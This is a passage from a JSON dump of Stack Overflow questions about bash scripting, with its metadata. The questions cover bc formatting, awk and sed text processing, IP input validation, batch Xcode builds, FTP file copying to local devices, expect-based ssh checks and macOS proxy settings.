<code>disown</code> at the end of <code>test.sh</code>, but it is still waiting for the pipe to be closed.</p>\n\n<hr>\n\n<p>What I actually try to achieve: I have a \"status\" script which collects the output of various scripts (<code>uptime</code>, <code>free</code>, <code>date</code>, <code>get-xy-from-dbus</code>, etc.), similar to this <code>test.sh</code> here. The output of the script is passed to my window manager, which displays it. It's also used in my GNU screen bottom line.</p>\n\n<p>Since some of the scripts that are used might take some time to create output, I want to detach them from output collection. So I put them in a <code>while true; do script; sleep 1; done</code> loop, which is started if it is not running yet.</p>\n\n<p>The problem here is now that I don't know how to tell the calling script to \"really\" detach the daemon process.</p>\n"},{"tags":["bash","format"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":32,"score":3,"question_id":13067148,"title":"bad format decimal in bash script","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/8402181/how-do-i-get-bc1-to-print-the-leading-zero\">How do I get bc(1) to print the leading zero?</a>  </p>\n</blockquote>\n\n\n\n<p>I have this problem:</p>\n\n<pre><code>x=$(echo \"0.81+0.02\" |bc)\necho $x\n</code></pre>\n\n<p>Result <strong>.83</strong></p>\n\n<p>I want see 0.83, but I don't make it.</p>\n"},{"tags":["bash","unix","script"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13069766,"title":"clear memory with variable","body":"<p>Currently I'm creating a little script in BASH that will ask the user to fill in a new IP-address, subnet and gateway. That input goes to a file which will be writen to /etc/network/interface..</p>\n\n<p>I got the script working, but it isn't bullet proof.</p>\n\n<p>When the user input, is not a number but an alphabetic character, It returns and the user needs to fill again a number.\nWhen the user still uses a alphabetic character, the script continues, even though giving a error.</p>\n\n<p>My code:</p>\n\n<pre><code>    echo \"Fill in your IP\"\n    read NEW_IP\n\n    oldIFS=$IFS\n    IFS=.\n    set -- $NEW_IP\n\n    while [ $# -ne \"4\" ]; do  \n      echo \"Must have 4 parts\"\n        read NEW_IP\n        set -- $NEW_IP \n    done\n\n    for oct in $1 $2 $3 $4; do\n      echo $oct | egrep \"^[0-9]+$\" &gt;/dev/null 2&gt;&amp;1 \n      while [ \"$?\" -ne \"0\" ]; do\n          echo \"$oct is not numeric. fill your IP in the correct format;\"\n        read NEW_IP\n      set -- $NEW_IP \n    done\n</code></pre>\n\n<p>I'm new with bash, above I didn't make it by my self. I've found this script on the internet. The while and do, I made that by my self as a loop.\nEverytime the user fills in a wrong number It must return untill the user filled in a correct format.</p>\n\n<p>The real problem lies at the second half of the code. When I fill in a wrong IP like 10.10.10.a, I get the error like I want and I have to fill in for the second time my IP.\nWhen I type 10.41.12.r, an error occured but this time, not complaining about the r at the end, but still complaining about the a which I inserted at the first. 10.41.12 will be checkt, but that last character is different.</p>\n\n<p>I can imagine that everything will be stored in memory, but how do I clear that?\nunset or $oct=<br>\nwon't work</p>\n\n<p>Hope that someone can help me with this. It's my first time programming, and this is giving me a headache</p>\n\n<p>thanks.</p>\n\n<p>Dave</p>\n"},{"tags":["bash","sed","awk"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":13064999,"title":"How Can I Run a RegExp Sub on Every gz in a Folder with Bash/Sed/Awk?","body":"<p>I have a bunch of gzipped files in a folder where each line of each file is of the form:</p>\n\n<pre><code>thing, thing2, something, thing4, other_thing, etc...\n</code></pre>\n\n<p>All I want to do is replace the first two commas in each line of each file with tabs, so that each line should look like:</p>\n\n<pre><code>thing\\t thing2\\t something, thing4, other_thing, etc...\n</code></pre>\n\n<p>There are a ton of these files, so I'm just looking for the fastest, most painless way of running this huge replacement. At the end, I'd like to have all of the same files with the same file names and just that one replacement. Ideas?</p>\n"},{"tags":["bash","shell","script","awk"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":145,"score":3,"question_id":13012000,"title":"shell script: with awk, write string1 if string0 is found, else string2","body":"<p>I've got a sequence of directories</p>\n\n<pre><code>079/af3\n100/af4\n120/af3\n  . \n  .\n  .\n</code></pre>\n\n<p>Each <code>???/af?</code> directory contains a very long file <code>results.stdout</code>. Close to the end of this file, one finds the string</p>\n\n<pre><code> Normal termination: iterations complete!\n</code></pre>\n\n<p>if the computation in af3 (resp. af4) was successful, otherwise one or more error messages are written in the file. To avoid having to check each file by hand, I'm writing a script which generates a summary file:</p>\n\n<pre><code> Massflow        af3      af4 \n      079    Success  Failure\n      100    Failure  Success\n      120    Success  Success\n        .      .       .\n        .      .       .\n</code></pre>\n\n<p>So far, I've been able to cook up the following:</p>\n\n<pre><code>#!/bin/bash\n\nstrlen=\"9\" # want to keep the format flexible, instead than hardcode it\nformat0=\"%\"$strlen\"s %\"$strlen\"s %\"$strlen\"s\\n\"\n# write the header of file summary\nawk -v format=\"$format0\" ' BEGIN { printf format, \"Massflow\", \"af3\", \"af4\"\n                             } ' &gt;&gt; summary\n\n\nfor dir in ??? # loop on all the directories\ndo\n    for j in 3 4 # loop on the two subdirs\n    do\n    result[$j]=$(tac $dir/af$j/results.stdout | awk '\n    /TACOMA:- Normal termination: iterations complete!/ {success = 1; exit}\n    END { if (success == 1)\n              print \"Success\"\n          else\n              print \"Failure\"\n        }')\n    done\ndone\nexit \n</code></pre>\n\n<p>However, I don't know how to write the summary file...I'd like to pass the <code>result</code> array to another awk program, but awk doesn't accept array variables. Any suggestions? Feel free to change the approach or even the tools, if you think my programming style, tools choice or both suck :)</p>\n"},{"tags":["linux","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13067236,"title":"create iso from dir having some hidden directories","body":"<p>I have a directory which is having many files and folders(some are hidden). I tried the below commands for creating ISO:\ncd /path/of/content/dir/ &amp;&amp; mkisofs -o /path/of/iso/file.iso * <strong>[In this case it is leaving hidden dirs]</strong></p>\n\n<p>&amp;&amp;</p>\n\n<p>cd /path/of/content/dir/ &amp;&amp; mkisofs -o /path/of/iso/file.iso ./{*,.[^.]*}   <strong>[In this case ISO is building with completely unexpected structure]</strong></p>\n\n<p>Please help?</p>\n"},{"tags":["java","linux","bash","stdin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13066176,"title":"stdin switching between bash and Java","body":"<p>I'm writing a script to launch a Java app and securely provide the Java app with a password. The password should not be echoed to the screen and should not be visible to anyone listing running processes. The following script works fine for this:</p>\n\n<pre><code>echo -n \"enter password: \"\nread -r -s password\njava -classpath $CLASSPATH com.myclientscompany.Manage&lt;&lt;EOF\n$password\nEOF\n</code></pre>\n\n<p>...with the Java program reading the password as a line from stdin.</p>\n\n<p>The problem I'm facing is that after taking the password in this way, I want the Java app to interactively accept further inputs from the user via the console. As it stands currently, every subsequent attempt to read from stdin within Java returns immediately with <code>null</code>. </p>\n\n<p>Is there a way to switch the stdin back to taking console input at the end of this script?</p>\n"},{"tags":["linux","bash","script","sed","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":13064201,"title":"searching for and echoing a portion of string in bash","body":"<p>What's the best way to search in a string for a given pattern and echoing it without using awk? I'd like to use the standard command like <code>grep</code>, <code>cat</code>, <code>cut</code>, or <code>sed</code>.</p>\n\n<p><strong>Example:</strong></p>\n\n<p>Let's pretend I want to strip out the device addresses of all the USB controllers from the output of <code>lspci</code> command:</p>\n\n<pre><code>[artlab@localhost ~]$ lspci\n\n00:00.0 Host bridge: Intel Corporation Core Processor DRAM Controller (rev 18)\n00:1a.0 USB controller: Intel Corporation 5 Series/3400 Series Chipset USB2 Enhanced Host Controller (rev 05)\n00:1c.0 PCI bridge: Intel Corporation 5 Series/3400 Series Chipset PCI Express Root Port 1 (rev 05)\n00:1c.4 PCI bridge: Intel Corporation 5 Series/3400 Series Chipset PCI Express Root Port 5 (rev 05)\n00:1c.5 PCI bridge: Intel Corporation 5 Series/3400 Series Chipset PCI Express Root Port 6 (rev 05)\n00:1d.0 USB controller: Intel Corporation 5 Series/3400 Series Chipset USB2 Enhanced Host Controller (rev 05)\n00:1e.0 PCI bridge: Intel Corporation 82801 PCI Bridge (rev a5)\n00:1f.0 ISA bridge: Intel Corporation 3400 Series Chipset LPC Interface Controller (rev 05)\n00:1f.2 RAID bus controller: Intel Corporation 82801 SATA Controller [RAID mode] (rev 05)\n00:1f.3 SMBus: Intel Corporation 5 Series/3400 Series Chipset SMBus Controller (rev 05)\n02:00.0 Ethernet controller: Intel Corporation 82574L Gigabit Network Connection\n03:00.0 Ethernet controller: Intel Corporation 82574L Gigabit Network Connection\n04:03.0 VGA compatible controller: Matrox Graphics, Inc. MGA G200eW WPCM450 (rev 0a)\n</code></pre>\n\n<p>I'd like to retrieve (print out) the two strings:</p>\n\n<pre><code>00:1a.0\n00:1d.0\n</code></pre>\n"},{"tags":["bash","text","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13063565,"title":"Add symbol to the end of each string in the file","body":"<p>I have txt file with plain text. There are only text strings, something like:</p>\n\n<pre><code>asdasd asd asd asd\nasdasdasdasd asd a\nasdasdasdasdasdasd\n</code></pre>\n\n<p>I need to add <strong>;</strong> symbol to the end of every string. I need to get:</p>\n\n<pre><code>asdasd asd asd asd;\nasdasdasdasd asd a;\nasdasdasdasdasdasd;\n</code></pre>\n\n<p>How can i make this with awk or another text processing utils?</p>\n\n<p>Thank you.</p>\n"},{"tags":["bash","parsing","haskell"],"answer_count":1,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":114,"score":7,"question_id":13054933,"title":"Haskell library for parsing Bash scripts?","body":"<p>Does anybody know of a Haskell library which can parse arbitrary Bash scripts?</p>\n\n<p>A cursory search of Hackage indicates that there's a package called <code>bash</code> for <em>writing</em> scripts, but I don't see anything for <em>parsing</em> them.</p>\n\n<p>Basically I've just had a large collection of Bash scripts dumped on me, and I'd like to do some code analysis on it. But the first stage is obviously to be able to parse this stuff.</p>\n\n<p>I don't know Bash very well personally. I suppose I <em>could</em> sit down and wage through the volumous man-page to get the complete BNF grammar for it. (I imagine it's very complex, given the shell's long and backwards-compatible history.) I was just wondering whether somebody else has already done this work for me...</p>\n"},{"tags":["bash","shell","quoting"],"answer_count":4,"favorite_count":0,"up_vote_count":9,"down_vote_count":0,"view_count":1752,"score":9,"question_id":2657012,"title":"Unix: How to properly nest Bash backticks","body":"<p>Either I missed some backlash or backlashing does not seem to work with too much programmer-quote-looping.</p>\n\n<pre><code>$ echo \"hello1-`echo hello2-\\`echo hello3-\\`echo hello4\\`\\``\"\n\nhello1-hello2-hello3-echo hello4\n</code></pre>\n\n<p><strong>Wanted</strong></p>\n\n<pre><code>hello1-hello2-hello3-hello4-hello5-hello6-...\n</code></pre>\n"},{"tags":["php","bash","script","sed","find"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":47,"score":-2,"question_id":13061010,"title":"Bash script which adds a line before every curly brackets in PHP code","body":"<p>I need to create a bash script that adds a row before every  curly bracket for functions, classes (classes and methods) and try/catch blocks</p>\n\n<p>I think using the program in conjunction with sed E.G.:</p>\n\n<pre><code>*find . -type f \\( -name \"*.php \\) -exec sed .......*\n</code></pre>\n\n<p>For example:</p>\n\n<pre><code>&lt;?php\nfunction my_function() {\n\n}\n?&gt;\n</code></pre>\n\n<p>Becomes:</p>\n\n<pre><code>&lt;?php\nfunction my_function() \n{\n\n}\n?&gt;\n</code></pre>\n"},{"tags":["linux","bash","shell","unix"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13060264,"title":"Find which file has the issue from the below Shell Script","body":"<p><strong>Problem Statement:-</strong>\nBelow is the script that someone else wrote and he left the company so I don't know whom should I ask about this. So that is the reason I am posting here to find the solution.</p>\n\n<p>What this script does is- It gzip the data from a particular folder <code>(/data/ds/real/EXPORT_v1x0)</code> for a particular date (20121017) and move it back to HDFS <code>(hdfs://ares-nn/apps/tech/ds/new/)</code> directory.</p>\n\n<pre><code>date=20121017\ngroups=(0 '1[0-3]' '1[^0-3]' '[^01]')\n  for shard in 0 1 2 3 4 5 6 7 8 9 10 11; do\n    for piece in 0 1 2 3; do\n        group=${groups[$piece]}\n        if ls -l /data/ds/real/EXPORT_v1x0_${date}_${shard}_T_${group}*.dat.gz; then\n          gzip -dc /data/ds/real/EXPORT_v1x0_${date}_${shard}_T_${group}*.dat.gz | \\\n          hadoop jar /export/home/ds/lib/HadoopUtil.jar com.host.hadoop.platform.util.WriteToHDFS -z -u \\\n          hdfs://ares-nn/apps/tech/ds/new/$date/EXPORT-part-$shard-$piece\n          sleep 15\n       fi\n    done\n  done\n</code></pre>\n\n<p>So during the migration to HDFS I found out this file has some problem in HDFS-</p>\n\n<pre><code>hdfs://ares-nn/apps/tech/ds/new/20121017/EXPORT-part-8-3\n</code></pre>\n\n<p>So Is there any way by doing some permutation from the above script we can find out what are the files under this directory <code>(/data/ds/real/EXPORT_v1x0)</code> which ultimately got converted to this <code>hdfs://ares-nn/apps/tech/ds/new/20121017/EXPORT-part-8-3</code> which has the problem.</p>\n\n<p>Any thoughts?</p>\n\n<p><strong>Update:-</strong></p>\n\n<p>Something like this below?</p>\n\n<pre><code>groups=(0 '1[0-3]' '1[^0-3]' '[^01]')\n  for shard in 0 1 2 3 4 5 6 7 8 9 10 11; do\n    for piece in 0 1 2 3; do\n        group=${groups[$piece]}\n        if ls -l /data/ds/real/EXPORT_v1x0_${date}_${shard}_T_${group}*.dat.gz; then\n          [ \"$date/EXPORT-part-$shard-$piece\" == \"20121017/EXPORT-part-8-3\" ] &amp;&amp; {\n                echo /data/real/EXPORT_v1x0_${date}_${shard}_T_${group}*.dat.gz\n            }\n         fi\n    done\n  done\n</code></pre>\n\n<p><strong>Few Sample Files Format I have in the /data/real/EXPORT folder-</strong>    </p>\n\n<pre><code>/data/real/EXPORT_v1x0_20121017_4_T_115600_115800.dat.gz\n/data/real/EXPORT_v1x0_20121017_4_T_235600_235800.dat.gz\n/data/real/EXPORT_v1x0_20121017_4_T_115800_120000.dat.gz\n/data/real/EXPORT_v1x0_20121017_4_T_235800_000000.dat.gz\n</code></pre>\n\n<p>And few sample output that I got after making changes-</p>\n\n<pre><code>/data/real/EXPORT_v1x0_20121017_0_T_0*.dat.gz: No such file or directory\n/data/real/EXPORT_v1x0_20121017_0_T_1[0-3]*.dat.gz: No such file or directory\n/data/real/EXPORT_v1x0_20121017_0_T_1[^0-3]*.dat.gz: No such file or directory\n/data/real/EXPORT_v1x0_20121017_0_T_[^01]*.dat.gz: No such file or directory\n</code></pre>\n"},{"tags":["bash","floating-point"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13059845,"title":"Bash C style arithmetic with floating point value","body":"<p>How can I have the right result from this bash script?</p>\n\n<pre><code>#!/bin/bash\necho $(( 1/2 ))\n</code></pre>\n\n<p>I get <code>0</code> as result! So I tried to use these but without success:</p>\n\n<pre><code>$ echo $(( 1/2.0 ))\nbash: 1/2.0 : syntax error: invalid arithmetic operator (error token is \".0 \")\n$ echo $(( 1.0/2 ))\nbash: 1.0/2 : syntax error: invalid arithmetic operator (error token is \".0/2 \")\n</code></pre>\n"},{"tags":["bash"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":44,"score":-1,"question_id":13059583,"title":"Where do you store the keys that the user pressed?","body":"<p>Where do you store the keys that the user pressed?\nIt is clear the queue? Thank you\nexample</p>\n\n<pre><code>while true; do\necho \"key?\"\nread -n1 -s PRESS\ncase \"$PRESS\" in\n            a) echo \"function_a\";;\n            b) echo \"function_b\";;\nesac\ndone\n</code></pre>\n\n<p>user presses a, user waiting 1.sec, user presses a = OK<br>\nuser presses aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa !!Problem!!</p>\n\n<p>Where is it stored? It's going to delete it? Delete cache? Delete buffer keyboard? Really do not know :( Thank you.</p>\n"},{"tags":["python","bash","environment-variables"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13059448,"title":"One environment variable available to python child process and another not","body":"<p>Assigning a multiline string to <code>FOO</code> works as expected:</p>\n\n<pre><code>$ read -d '' FOO &lt;&lt;\"EOF\"\n&gt; the content\n&gt; EOF\n$ echo $FOO\nthe content\n$ python -c \"import os; print os.environ.get('FOO')\"\nthe content\n</code></pre>\n\n<p>Seemingly the same thing with <code>FOO_BAR_BAZ</code> works differently:</p>\n\n<pre><code>$ read -d '' FOO_BAR_BAZ &lt;&lt;\"EOF\"\n&gt; the content\n&gt; EOF\n$ echo $FOO_BAR_BAZ\nthe content\n$ python -c \"import os; print os.environ.get('FOO_BAR_BAZ')\"\nNone\n</code></pre>\n\n<p>I either have a subtle error or a misunderstanding.</p>\n"},{"tags":["linux","bash","grep","find","xargs"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13055768,"title":"Linux: Does find | xargs grep have limitations?","body":"<p>I've historically performed something like:</p>\n\n<pre><code>find . 2&gt;/dev/null | xargs grep -i something_to_find 2&gt;/dev/null\n</code></pre>\n\n<p>In if my <code>pwd</code> is barfoo (<code>/foo/bar/baz/foofoo/foobar/foobaz/barfoo</code>) it finds matches.  However, if I <code>cd</code> to <code>/foo</code>, it no longer finds the matches.</p>\n\n<hr>\n\n<p>Conditions:</p>\n\n<ul>\n<li>permissions are all 775</li>\n<li>the directories are not symbolic links</li>\n<li>they are all on the same file system / server</li>\n</ul>\n\n<hr>\n\n<p>So I'm curious if there is a default <code>-maxdepth</code> that is applied to find, or are there other constraints as to why this would not work?</p>\n\n<hr>\n\n<h3>Additional Info:</h3>\n\n<p>Some great comments have been posted.  Here is some additional info:</p>\n\n<ul>\n<li>this is for GNU, not POSIX</li>\n<li><code>find --version</code> : GNU find version 4.2.27</li>\n<li><code>grep --version</code> : (GNU grep) 2.5.1</li>\n<li><code>xargs --version</code> : GNU xargs version 4.2.27</li>\n<li>removing the redirection of STDERR has no bearing on the result, or lack thereof</li>\n<li>the path to the files in <code>barfoo</code> (known to work) do not have spaces, however files in other directories in <code>/foo/bar</code> may have spaces; though, I don't see how that would be problematic</li>\n<li>I realize I wasn't specific on the path, but these are all well-named directories, not to be confused with any devices</li>\n</ul>\n\n<h3>Interesting Finding:</h3>\n\n<p>The first doesn't work, but the second does:</p>\n\n<ol>\n<li><code>find . -type f                | xargs grep -i something_to_find</code></li>\n<li><code>find . -type f -name \"*.ext\"  | xargs grep -i something_to_find</code></li>\n</ol>\n\n<p>Even odder is that <code>-name \"*.*\"</code> does not work, the file extension has to be given; which could be problematic when searching for something.  </p>\n\n<p>I'm wondering if there is termination after a max error count, or maximum buffer size.  I know there are a lot of files in these directories, but the fact it works when specifying the filetype (limiting results) is interesting.</p>\n"},{"tags":["bash","sigint"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":13057771,"title":"SIGINT to cancel read in bash script?","body":"<p>I'm writting a bash wrapper to learn some scripting concepts. The idea is to write a script in bash and set it as a user's shell at login.</p>\n\n<p>I made a while loop that <code>read</code>s and <code>eval</code>s user's input, and then noticed that, whenever user typed <code>CTRL + C</code>, the script aborted so the user session ends.</p>\n\n<p>To avoid this, I trapped <code>SIGINT</code>, doing nothing in the trap.</p>\n\n<p>Now, the problem is that when you type <code>CTRL + C</code> at half of a command, it doesn't get cancelled as one would do on bash - it just ignores <code>CTRL + C</code>.</p>\n\n<p>So, if I type <code>ping stockoverf^Cping stackoverflow.com</code>, I get <code>ping stockoverfping stackoverflow.com</code> instead of the <code>ping stackoverflow.com</code> that I wanted.</p>\n\n<p>Is there any way to do that?</p>\n\n<pre class=\"lang-bsh prettyprint-override\"><code>#!/bin/bash\n\n# let's trap SIGINT (CTRL + C)\ntrap \"\" SIGINT\n\nwhile true\ndo\n    read -e -p \"$USER - SHIELD: `pwd`&gt; \" command\n    history -s $command\n    eval $command\ndone\n</code></pre>\n"},{"tags":["ios","bash","shell","xcode4.2",".bash-profile"],"answer_count":2,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":198,"score":2,"question_id":11526567,"title":"Batch Build and Archive of iOS apps via Terminal","body":"<p>I am trying to simplify the build->archive->submit process for iOS app publishing.\nWe have over 50 mobile apps that have nearly identical framework, but with different artwork and configuration settings.</p>\n\n<p>I normally would load each project in xcode 4.2 and build->archive->submit the usual way with the xcode GUI, but we are up over 50 apps now and this process is very tiresome any time we push out an update.</p>\n\n<p>That being said, I am trying to speed up this process with using a shell function.\nI did plenty of research and found that <a href=\"http://stackoverflow.com/questions/2664885/xcode-build-and-archive-from-command-line\">xcodebuild</a> (See Reid's answer) should work, however the Archive option is not working as I get the following error:</p>\n\n<pre><code>unsupported build action 'archive'\n</code></pre>\n\n<p>So I wrote the following:</p>\n\n<pre><code># $1 should be a date like: 2012-07-17\n# $2 should be a time like: 10.31AM\n# $mybase will be the current directory at the time the function was called\n# so make sure to cd into the folder containing the xcode project folders first\n\nfunction xcodeArchive {\n    mkdir ~/Library/Developer/Xcode/Archives/$1\n    mybase=$PWD\n    for x in `ls`\n    do\n        mkdir ~/Library/Developer/Xcode/Archives/$1/$x\n        mkdir ~/Library/Developer/Xcode/Archives/$1/$x/dSYMs\n        mkdir ~/Library/Developer/Xcode/Archives/$1/$x/Products\n        mkdir ~/Library/Developer/Xcode/Archives/$1/$x/Products/Applications\n        cd $mybase/$x\n        xcodebuild\n        #read -p \"Press [Enter] to continue\"\n        cd $mybase/$x\n        cp $x/$x-Info.plist ~/Library/Developer/Xcode/Archives/$1/$x/Info.plist\n        cp -r build/Release-iphoneos/$x.app.dSYM ~/Library/Developer/Xcode/Archives/$1/$x/dSYMs/$x.app.dSYM\n        cp -r build/Release-iphoneos/$x.app ~/Library/Developer/Xcode/Archives/$1/$x/Products/Applications/$x.app\n        cd ~/Library/Developer/Xcode/Archives/$1/\n        mv $x $x\\ $1\\ $2.xcarchive\n        cd $mybase\n    done\n}\nexport -f xcodeArchive\n</code></pre>\n\n<p>I put this in my .bash_profile and everything runs correctly as I would expect, except I'm not copying the correct \"Info.plist\" and I can't figure out where to copy it from or how to generate it. So now I am stuck.</p>\n\n<p>Xcode will recognize the archives, but it lists them under \"Unknown Schema\" and \"Unnamed Archive\" in the organizer.</p>\n\n<p><strong>Any help regarding now to get the correct Info.plist is greatly appreciated.</strong></p>\n\n<p>I also welcome recommendations on how to improve the script and/or a more efficient way to batch build+archive these iOS apps. </p>\n\n<p><em><strong>Note:</em></strong></p>\n\n<ul>\n<li><p>I am unable to upgrade beyond Xcode 4.2 as that requires (as I understand it) OS X 10.7+ which I am not able to obtain yet (company computer).</p></li>\n<li><p>I am still very much a bash/shell novice, so I apologize for any ugly code/practice above.</p></li>\n<li><p>Also, this is for official app submission, not for ad-hoc or anything like that.</p></li>\n</ul>\n\n<p>Thanks again for your help.</p>\n"},{"tags":["php","apache","bash","permissions","blast"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13017272,"title":"File not found, but files are present","body":"<p>I'm working on a server where users should be able to run protein sequences against a database, and it uses an executable called blastall. The server generates an executable which it should then run using batch. However, it doesn't appear to be running. Here is an example of an executable is generates (cmd.sh):</p>\n\n<pre><code>#!/usr/bin/env sh\ncd /var/www/dbCAN\nphp -q /var/www/dbCAN/tools/blast.php -e -w /var/www/dbCAN/data/blast/20121019135548\n</code></pre>\n\n<p>Where the crazy number at the end of that is an auto-generated job ID based on when the job was submitted. There are 2 issues, and I'm trying to solve one at a time. The first issue is that when manually executed (by me simply running ./cmd.sh), I get the following errors:</p>\n\n<pre><code>sh: 1: /var/www/dbCAN/tools/blast/bin/blastall: not found\nsh: 1: /var/www/dbCAN/tools/blast/bin/blastall: not found\nsh: 1: -t: not found\n</code></pre>\n\n<p>But this doesn't really make sense to me, as the directory specified does in fact contain blastall. It has full rwx permissions and every directory along the way has appropriate permissions. </p>\n\n<p>The blast.php file in tools looks like this:</p>\n\n<pre><code>try {\n  do_blast($opts[\"w\"]);\n  $info['status'] = 'done';\n  $fp = fopen(\"$opts['w']/info.yaml\",\"w\")\n  fwrite($fp, Sypc::YAMLDump($info)); fclose($fp);  \n}\n</code></pre>\n\n<p>With of course variable declarations above it, and the do_blast function looks like this (again with variables declared above it and a cd so the directories work out):</p>\n\n<pre><code>function do_blast($workdir)\n{\n  system(\"/var/www/dbCAN/tools/blast/bin/blastall -d data/blast/all.seq.fa -m 9 -p blastp -i $workdir/input.faa -o $workdir/output.txt\")\n  system(\"/var/www/dbCAN/tools/blast/bin/blastall -d data/blast/all.seq.fa -p blastp -i $workdir/input.faa -o $workdir/output2.txt\")\n}\n</code></pre>\n\n<p>Any idea what may be causing this issue? I thought it may be because I'm running it and it was created by apache, but rwx is allowed for all users. I can include more information if needed, but I chose not to at this point because the original person who wrote the PHP split up everything into tons of little files, so it's difficult to pinpoint where the problem is exactly. Any ideas (if not complete solutions) are very appreciated.</p>\n\n<p>EDIT: Solution found. As it turns out, the blastall executable had been compiled on a different linux system. Switched to a different executable and it ran flawlessly. </p>\n"},{"tags":["linux","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":36,"score":1,"question_id":13056926,"title":"shell script syntax error near unexpected 'done'","body":"<p>hi im new to linux and need help with a shell script i am writing to automatically find the ip of ftp servers and copy files to them. this is the code i have but it errors when run </p>\n\n<pre><code>USER=anonymous\nPWD=any\nPORTCHECK=\"1\"\nfor IP in 'sqe 6 250';\ndo\nPORTCHECK= nmap -p21 -oG - 192.168.1.$IP | grep '21/open'\nif [$PORTCHECK != \"1\" ]; then\nftp -p -n -i -v 192.168.1.$IP\nuser $USER $PWD\ncd \"Mounted Volume\"\nput foo\nput bar\nbye\nif\nCHECKPORT=\"1\"\ndone\n</code></pre>\n\n<p>and the error is </p>\n\n<pre><code>./newscrpt: line 19: syntax error near unexpected token `done'\n./newscrpt: line 19: `done'\n</code></pre>\n\n<p>this is being used to copy file to multiple winCE media system after reinstall please help i cant work it out</p>\n"},{"tags":["bash","scripting"],"answer_count":2,"favorite_count":2,"up_vote_count":9,"down_vote_count":0,"view_count":6000,"score":9,"question_id":1378274,"title":"In a bash script, how can I exit the entire script if a certain condition occurs?","body":"<p>I'm writing a script in Bash to test some code. However, it seems silly to run the tests if compiling the code fails in the first place, in which case I'll just abort the tests.</p>\n\n<p>Is there a way I can do this without wrapping the entire script inside of a while loop and using breaks? Something like a <strong>dun dun dun</strong> goto?</p>\n"},{"tags":["linux","bash","command-line"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":160,"score":2,"question_id":11834899,"title":"Tail inverse / printing everything except the last n lines?","body":"<p>Is there a (POSIX command line) way to print all of a file EXCEPT the last n lines? Use case being, I will have multiple files of unknown size, all of which contain a boilerplate footer of a known size, which I want to remove. I was wondering if there is already a utility that does this before writing it myself.</p>\n"},{"tags":["bash","shell","unix"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13055068,"title":"BASH - Quick networksetup command Q","body":"<p>I have the below command that fails when I run it through a bash script but If I copy each echoed statement and paste them in a terminal it works...</p>\n\n<pre><code>networksetup -listallntworkservices | while read line; do networksetup -setautoproxy '\"'$line'\"' http://etc...\n</code></pre>\n\n<p>I ideally only want to run the above command for network services that have \"Ethernet\" or \"Wi-fi\" in the name.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13054973,"title":"How to show text color in Bash","body":"<p>How to show text color?</p>\n\n<pre><code>a = background: Brown\na = text: White\n\nb = background: yellow\nb = text: black\n\necho -e \"bbb aaa bbb\"\nand\necho -e \"aaa bbb aaa\"\n</code></pre>\n\n<p>my result is not nice :-( Thank you</p>\n"},{"tags":["osx","bash","shell","unix","operating-system"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13054671,"title":"BASH - Run command for each line in output of previous command","body":"<p>All,\nI am want to request all network services using: </p>\n\n<pre><code> networksetup -listallnetworkservices\n</code></pre>\n\n<p>I then want to run the below command for each line in produced from the above command:</p>\n\n<pre><code>networksetup -setautoproxyurl \"A LINE FROM ABOVE\" http://etc...\n</code></pre>\n\n<p>Adiitonally, I only want to issue the setautoproxyurl command for service with \"Ethernet\" or \"Wi-Fi\" in the name</p>\n\n<pre><code> networksetup -listallnetworkservices | while read line; do networksetup -setautoproxy $line http://etc...\n</code></pre>\n"},{"tags":["file","bash","expect","channel","puts"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":13052232,"title":"expect puts write to file","body":"<p>I am writing an expect script that will ssh into several IPs to test their connectivity.  I would like to include a \"puts\" statement to write the result of each test to a file on the machine calling the script.  Although I think I'm following the manual for puts to write to a file, it only writes to stdout.  Please see the script below.  The end result is that the file is created on the local machine, but no output is directed to it.  Instead, the output goes to stdout.</p>\n\n<pre><code>#!/bin/bash\n\nUSER=user\nPASSWORD=password\nIPSTART=12.34.56.\nOUTFILE=\"TEST.log\"\nPROMPT=\"#\"\n\nfor IPEND in `seq 200 231`\ndo\n\nexpect -c \"\n        set timeout 3\n        set chan [open $OUTFILE w]\n        spawn ssh $USER@$IPSTART$IPEND\n                expect -re \\\".*ssword.*\\\" {send \\\"$PASSWORD\\n\\\"}\n\n                expect {\n                   